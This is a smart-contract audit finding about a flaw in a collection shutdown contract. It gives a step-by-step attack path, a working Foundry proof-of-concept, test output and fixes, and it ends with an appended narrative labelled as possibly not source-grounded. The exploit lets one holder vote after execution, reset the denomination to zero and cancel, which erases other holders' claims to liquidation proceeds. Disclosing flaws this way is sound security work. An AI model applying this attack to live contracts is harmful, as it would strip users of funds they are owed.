---
id: 23227
severity: "High"
---

# The attacker will prevent eligible users from claiming

## Description

The CollectionShutdown contract has vulnerabilities allowing a malicious actor to prevent eligible users from claiming the liquidated balance after liquidation by SudoSwap.
• The does not prevent voting after the collection shutdown is executed and/or during the claim state, allowing malicious actors to trigger canExecute to TRUE after execution.
• The does not use params.collectionToken to retrieve the denomination() for validating the total supply during cancellation, which opens the door to manipulations that can bypass the checks.
Internal pre-conditions
1. The collection token total supply must be within a valid limit for the shutdown condition (e.g., less than or equal to MAX_SHUTDOWN_TOKENS).
2. The denomination of the collection token for the shutdown collection is greater than 0.
External pre-conditions
1. The attacker holds some portion of the collection token supply for the shutdown collection.
Attack Path
Pre-condition:
1. Assume the collection token (CT) total supply is 4 CTs (4*1e18*10**denom).
2. There are 2 holders of this supply: Lewis (2 CTs) and Max (2 CTs).
Attack:
1. Lewis notices that the collection can be shutdown and calls CollectionShutdown::start().
• totalSupply meets the condition <=MAX_SHUTDOWN_TOKENS.
• params.quorumVotes = 50% of totalSupply = 2*1e18*1eDenom (2 CTs).
• Vote for Lewis is recorded.
• The contract transfer 2 CTs of Lewis balances, and params.shutdownVotes+=2CTs.
• Now params.canExecute is flagged to be TRUE since params.shutdownVotes(2CTs)>=params.quorumVotes(2CTs).
2. Time passes, no cancellation occurs, and the owner executes the pending shutdown.
• The NFTs are liquidated on SudoSwap.
• params.quorumVotes remains the same as there is no change in supply.
• The collection is sunset in the Locker, deleting _collectionToken[_collection] and collectionInitialized[_collection].
• params.canExecute is flagged back to FALSE.
After some or all NFTs are sold on SudoSwap:
3. Max monitors the NFT sales and prepares for the attack.
4. Max splits their balance of CTs to his another wallet and remains holding a small amount to perform the attack.
5. Max, who never voted, calls CollectionShutdown::vote() to flag params.canExecute back to TRUE.
• The contract transfer small amount of CTs of Max balances.
• Since params.shutdownVotes>=params.quorumVotes (due to Lewis' shutdown), params.canExecute is set back to TRUE.
6. Max registers the target collection again, manipulating the token's denomination via the Locker::createCollection().
• Max specifies a denomination lower than the previous one (e.g., previously 4, now 0).
7. Max invokes CollectionShutdown::cancel() to remove all properties of _collectionParams[_collection], including _collectionParams[].availableClaim.
• The following check passes:
```solidity
if (params.collectionToken.totalSupply() <= MAX_SHUTDOWN_TOKENS * 10 ** locker.collectionToken(_collection).denomination()) {
    revert InsufficientTotalSupplyToCancel();
}
```
• Since the new denomination is 0, the check becomes: (4 * 1e18 * 10 ** 4) <= (4 * 1e18 * 10 ** 0): FALSE Result: This check passes, allowing Max to cancel and prevent Lewis from claiming their eligible ETH from SudoSwap.
The attack allows a malicious actor to prevent legitimate token holders from claiming their eligible NFT sale proceeds from SudoSwap. This could lead to significant financial losses for affected users.

## Proof of Concept

Setup
• Update the to mint CTs token with denominator more that 0
```solidity
constructor () forkBlock(19_425_694) {
    // Deploy our platform contracts
    _deployPlatform();
    locker.createCollection(address(erc721b), 'Test Collection', 'TEST', 4);
}
```
• Put the snippet below into the protocol test suite: flayer/test/utils/CollectionShutdown.t.sol
• Run test: forge test --mt test_CanBlockEligibleUsersToClaim -vvv
Coded PoC
```solidity
function test_CanBlockEligibleUsersToClaim() public {
    address Lewis = makeAddr("Lewis");
    address Max = makeAddr("Max");
    address MaxRecovery = makeAddr("MaxRecovery");
    // -- Before Attack --
    // Mint some tokens to our test users -> totalSupply: 4 ethers (can shutdown)
    vm.startPrank(address(locker));
    collectionToken.mint(Lewis, 2 ether * 10 ** collectionToken.denomination());
    collectionToken.mint(Max, 2 ether * 10 ** collectionToken.denomination());
    vm.stopPrank();
    // Start shutdown with their vote that has passed the threshold quorum
    vm.startPrank(Lewis);
    uint256 lewisVoteBalance = 2 ether * 10 ** collectionToken.denomination();
    collectionToken.approve(address(collectionShutdown), type(uint256).max);
    collectionShutdown.start(address(erc721b));
    assertEq(collectionShutdown.shutdownVoters(address(erc721b), address(Lewis)), lewisVoteBalance);
    vm.stopPrank();
    // Confirm that we can now execute
    assertCanExecute(address(erc721b), true);
    // Mint NFTs into our collection {Locker} and process the execution
    uint[] memory tokenIds = _mintTokensIntoCollection(erc721b, 3);
    collectionShutdown.execute(address(erc721b), tokenIds);
    // Confirm that the {CollectionToken} has been sunset from our {Locker}
    assertEq(address(locker.collectionToken(address(erc721b))), address(0));
    // After we have executed, we should no longer have an execute flag
    assertCanExecute(address(erc721b), false);
    // Mock the process of the Sudoswap pool liquidating the NFTs for ETH. This will
    // provide 0.5 ETH <-> 1 {CollectionToken}.
    _mockSudoswapLiquidation(SUDOSWAP_POOL, tokenIds, 2 ether);
    // Ensure that all state are SET
    ICollectionShutdown.CollectionShutdownParams memory shutdownParamsBefore = collectionShutdown.collectionParams(address(erc721b));
    assertEq(shutdownParamsBefore.shutdownVotes, lewisVoteBalance);
    assertEq(shutdownParamsBefore.sweeperPool, SUDOSWAP_POOL);
    assertEq(shutdownParamsBefore.quorumVotes, lewisVoteBalance);
    assertEq(shutdownParamsBefore.canExecute, false);
    assertEq(address(shutdownParamsBefore.collectionToken), address(collectionToken));
    assertEq(shutdownParamsBefore.availableClaim, 2 ether);
    // -- Attack --
    uint256 balanceOfMaxBefore = collectionToken.balanceOf(address(Max));
    uint256 amountSpendForAttack = 1;
    // Transfer almost full funds to their second account and perform with small amount
    vm.prank(Max);
    collectionToken.transfer(address(MaxRecovery), balanceOfMaxBefore - amountSpendForAttack);
    uint256 balanceOfMaxAfter = collectionToken.balanceOf(address(Max));
    assertEq(balanceOfMaxAfter, amountSpendForAttack);
    // Max votes even it is in the claim state to flag the `canExecute` back to True
    vm.startPrank(Max);
    collectionToken.approve(address(collectionShutdown), type(uint256).max);
    collectionShutdown.vote(address(erc721b));
    assertEq(collectionShutdown.shutdownVoters(address(erc721b), address(Max)), amountSpendForAttack);
    vm.stopPrank();
    // Confirm that Max can now flag `canExecute` back to `TRUE`
    assertCanExecute(address(erc721b), true);
    // Attack to delete all variables track, resulting others cannot claim their eligible ethers
    vm.startPrank(Max);
    locker.createCollection(address(erc721b), 'Test Collection', 'TEST', 0);
    collectionShutdown.cancel(address(erc721b));
    vm.stopPrank();
    // Ensure that all state are DELETE
    ICollectionShutdown.CollectionShutdownParams memory shutdownParamsAfter = collectionShutdown.collectionParams(address(erc721b));
    assertEq(shutdownParamsAfter.shutdownVotes, 0);
    assertEq(shutdownParamsAfter.sweeperPool, address(0));
    assertEq(shutdownParamsAfter.quorumVotes, 0);
    assertEq(shutdownParamsAfter.canExecute, false);
    assertEq(address(shutdownParamsAfter.collectionToken), address(0));
    assertEq(shutdownParamsAfter.availableClaim, 0);
    // -- After Attack --
    vm.expectRevert();
    vm.prank(Lewis);
    collectionShutdown.claim(address(erc721b), payable(Lewis));
}
```
Result
Results of running the test:
Ran 1 test for test/utils/CollectionShutdown.t.sol:CollectionShutdownTest
[PASS] test_CanBlockEligibleUsersToClaim() (gas: 1491640)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.96s (3.48ms CPU time)
Ran 1 test suite in 11.17s (10.96s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

## Recommendation

• Add validations to prevent manipulation of the CT denomination, and restrict voting during the claim state to prevent re-triggering of params.canExecute.
```solidity
function vote(address _collection) public nonReentrant whenNotPaused {
    // Ensure that we are within the shutdown window
    CollectionShutdownParams memory params = _collectionParams[_collection];
    if (params.quorumVotes == 0) revert ShutdownProccessNotStarted();
    if (params.sweeperPool != address(0)) revert ShutdownExecuted();
    _collectionParams[_collection] = _vote(_collection, params);
}
```
• Update the usage of token denomination to use the token depends on the tracked token to inconsistent value.
```solidity
function cancel(address _collection) public whenNotPaused {
    // Ensure that the vote count has reached quorum
    CollectionShutdownParams memory params = _collectionParams[_collection];
    if (!params.canExecute) revert ShutdownNotReachedQuorum();
    // Check if the total supply has surpassed an amount of the initial required
    // total supply. This would indicate that a collection has grown since the
    // initial shutdown was triggered and could result in an unsuspected liquidation.
    if (params.collectionToken.totalSupply() <= MAX_SHUTDOWN_TOKENS * 10 ** params.collectionToken.denomination()) {
        revert InsufficientTotalSupplyToCancel();
    }
    // Remove our execution flag
    delete _collectionParams[_collection];
    emit CollectionShutdownCancelled(_collection);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides inthe shutdown and claim workflow of a collection liquidation contract. After a collection is marked for shutdown, the contract records a quorum of votes based on the total supply of a collection token. The implementation fails to block further voting once the shutdown has been executed and the claim phase has begun. Because voting remains possible, an attacker who holds any amount of the collection token can submit an additional vote after execution, which flips the internal flag that indicates the shutdown can be executed again. At the same time the contract retrieves the token denomination from a mutable source when performing the supply check in the cancel function. By creating a new collection entry with a deliberately lower denomination – even zero – the attacker manipulates the arithmetic condition that guards the cancel operation. The altered denominator makes the comparison of total supply against the maximum allowed supply evaluate to false, allowing the cancel function to succeed. The cancel call then deletes all stored parameters that track the amount of ETH available for claim, effectively erasing the claim rights of legitimate token holders. From a user’s perspective the expected outcome after NFTs are sold on the external marketplace is to receive a proportional ETH payout, but instead the claim transaction reverts or returns zero, leaving the user with no funds despite having a valid entitlement. The issue occurs only when a shutdown has been initiated, executed, and the contract is in the claim state, and when an attacker can both vote and create a new collection with a manipulated denomination. It affects any holder of the collection token who is entitled to claim proceeds, as well as the protocol that relies on the contract to distribute liquidation revenue. The flaw was uncovered during a security audit through a crafted proof‑of‑concept that demonstrated the full attack path, including token transfers, voting, denomination manipulation, and cancellation. The problem is subtle because the contract’s public functions appear to follow a normal lifecycle, and the re‑enablement of the execution flag through voting is not obvious. Moreover, the denomination value is not locked to the original token metadata, making the supply check vulnerable to tampering. To remediate the issue the contract should enforce a strict state machine that disallows any voting once the shutdown has been executed, lock the token denomination at the time of shutdown, and prevent the cancel function from being called after the claim phase has started. Additionally, the cancel logic should reference the original token parameters rather than a mutable source, ensuring that total‑supply validation cannot be bypassed. Implementing these safeguards restores the intended accounting guarantees, guarantees that users receive their rightful ETH proceeds, and eliminates the possibility for an attacker to block legitimate claims.
